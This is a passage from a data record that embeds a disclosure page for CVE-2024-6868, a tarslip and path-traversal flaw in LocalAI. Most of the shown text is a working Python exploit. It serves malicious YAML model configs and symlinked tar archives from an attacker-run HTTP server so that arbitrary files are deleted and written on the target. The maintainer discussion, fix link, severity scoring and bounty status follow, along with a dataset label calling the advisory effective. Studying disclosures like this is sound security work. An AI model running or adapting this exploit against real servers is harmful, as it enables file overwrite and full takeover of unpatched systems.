randbytes, randint\nfrom pathlib import Path\nfrom argparse import ArgumentParser\nfrom requests import Session\n\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom multiprocessing import Process, Queue\n\n\n# small template for models that will be served to localai:\nmodel_tmpl = \"\"\"\nname: {}\nfiles:\n  - filename: {}\n    uri: {}\n\"\"\"\n\n\ng_queue = Queue() # used for some janky ipc with http server\n\nclass HttpHandler(BaseHTTPRequestHandler):\n    def log_message(self, format, *args):\n        pass\n\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('content-type', 'application/text')\n        self.end_headers()\n        rsp = g_queue.get()\n        print(f\"response to {self.path}:\", rsp[:64], \"...\")\n        self.wfile.write(rsp)\n\ndef run_httpd(lhost, lport):\n    print(f\"running httpserver on {lhost}:{lport}\")\n    httpd = HTTPServer((lhost, lport), HttpHandler)\n    httpd.serve_forever()\n\n\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--lhost\", default=\"localhost\")\n    parser.add_argument(\"--url\", default=\"http://localhost:8080\")\n    parser.add_argument(\"--local_path\", default=\"poc.txt\")\n    parser.add_argument(\"--remote_path\", default=\"/tmp/poc.txt\")\n    args = parser.parse_args()\n\n    remote_path = Path(args.remote_path)\n\n\n    # --lhost is attackers host as seen from the localai, so if localai\n    # runs in docker use 172.17.0.1 (or something like that depending on\n    # your system), if running locally just use localhost:\n    lport = randint(50000, 60000)\n    attacker_url = f\"http://{args.lhost}:{lport}\"\n\n    # run http service that will serve the files:\n    proc = Process(target=run_httpd, args=(args.lhost, lport))\n    proc.start()\n    time.sleep(1)\n\n    with Session() as s:\n        # use another vulnerability to delete the target first, because our \"arbitrary\"\n        # write can not overwrite files, just write a new file:\n        m_name = \"m_\" + randbytes(4).hex()\n        g_queue.put(f\"name: {m_name}\\n\".encode())\n        rsp = s.post(f\"{args.url}/models/apply\", json={\n            \"url\" : f\"http://{args.lhost}:{lport}/{m_name}.yaml\",\n            \"overrides\" : {\n                \"mmproj\" : f\"../../../../../../../../../../{args.remote_path}\",\n            }\n        })\n        rsp = s.post(f\"{args.url}/models/delete/{m_name}\")\n\n        # create a model from a config and let it download the files. If the file is an archive\n        # it will automatically uncompress the contents:\n        m_name = \"m_\" + randbytes(4).hex()\n        model_yaml = model_tmpl.format(m_name, f\"{m_name}.tar\", f\"{attacker_url}/{m_name}.tar\")\n\n        g_queue.put(model_yaml.encode())\n        rsp = s.post(f\"{args.url}/models/apply\", json={\n            \"url\" : f\"http://{args.lhost}:{lport}/{m_name}.yaml\",\n        })\n\n        # create a tar file with a symlink pointing to the directory of `remote_path`.\n        redirect = randbytes(4).hex()\n        fake_tar = BytesIO()\n        with tarfile.open(fileobj=fake_tar, mode=\"w\") as tar:\n            info = tarfile.TarInfo(redirect)\n            info.type = tarfile.SYMTYPE\n            info.linkname = str(remote_path.parent)\n            tar.addfile(info)\n\n        g_queue.put(fake_tar.getvalue())\n\n        # do another tarslip, but this time save the .tar file to symlink'ed directory\n        # so that the contents of this new tar are extracted there. this will allow to\n        # write a file with the same attributes as `args.local_path`\n        m_name = \"m_\" + randbytes(4).hex()\n        model_yaml = model_tmpl.format(m_name, f\"{redirect}/{redirect}.tar\", f\"{attacker_url}/{m_name}.tar\")\n        g_queue.put(model_yaml.encode())\n\n        rsp = s.post(f\"{args.url}/models/apply\", json={\n            \"url\" : f\"http://{args.lhost}:{lport}/{m_name}.yaml\",\n        })\n\n        fake_tar = BytesIO()\n        with tarfile.open(fileobj=fake_tar, mode=\"w\") as tar:\n            tar.add(args.local_path, arcname=str(remote_path.name))\n\n        g_queue.put(fake_tar.getvalue())\n\n        time.sleep(1)\n        input(\"press enter to continue...\")\n\n    proc.kill()\nImpact\nThis vulnerability can write and overwrite arbitrary files on server, potentially leading to a full takeover.\nWe are processing your report and will contact themudler/localai team within 24 hours.a year ago\nozelis modified the reporta year ago\nozelis modified the reporta year ago\nWe have contacted a member of themudler/localai team and are waiting to hear backa year ago\nA mudler/localai maintainerhas acknowledged this reporta year ago\nThe scheduled publication date was automatically extended from 18th Sep 2024  to 25th Sep 2024  due to the maintainers acknowledgement of the reporta year ago\nEttore Di Giacinto\ncommenteda year ago\nMaintainer\nHi - thanks for the report and for reaching us in private - we are taking care of it already.\nOne thing is that I would like to discuss - the CVE severity: while the attack is genuinely possible, LocalAI's access can be gated by API_KEYS which increases the attack complexity, as an attacker would need to know the API_KEYS in order to trigger the vulnerability.\nWhile by default API_KEYS are not set, as LocalAI usage is intended primarly for local use, if exposing LocalAI outside these should be used.\nEttore Di Giacinto\ncommenteda year ago\nMaintainer\nA fix for this is present in : https://github.com/mudler/LocalAI/pull/2647\nozelis\ncommenteda year ago\nResearcher\nI agree, I just looked at a recent vulnerability that used models/apply endpoint and copied that as I thought that was already resolved. I will change it authentication to required, this will lower the cve score\nozelis modified the reporta year ago\nEttore Di Giacinto gave praisea year ago\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nEttore Di Giacinto\ncommenteda year ago\nMaintainer\nCould you please validate that https://github.com/mudler/LocalAI/pull/2647 fixes the issue? Thank you again!\nozelis\ncommenteda year ago\nResearcher\nThis fixes the tarslip issue, but in DeleteModelFromSystem() i think you should also check with InTrustedRoot() that the file is in model directory before os.Remove(), because there are still a bunch of path traversal issues (i used one in PoC for example)\nMarcellomodified the Severity from High (8.8) to High (8.1)10 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nMarcello validated this vulnerability10 months ago\nozelishas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-6868assigned to this report.10 months ago\nEttore Di Giacintomarked this as fixedin 2.18.1with commita181dd10 months ago\nEttore Di Giacintohas been awarded the fix bounty\nWe have notified the mudler/localai maintainers about this report in their weekly follow-up8 months ago\nWe have sent a warning to the mudler/localai team to inform them that this report will be published in 48 hours8 months ago\nThis vulnerability has now been published8 months ago\nSign in to join this conversation\nCVE\nCVE-2024-6868\n(Published)\nVulnerability Type\nCWE-20: Improper Input Validation\nSeverity\nHigh (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\n2.17.1\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory provides a detailed proof-of-concept including scripts and methodology to reproduce the described vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-20",
                "value": "CWE-20 Improper Input Validation"
            }
        ]
    }
}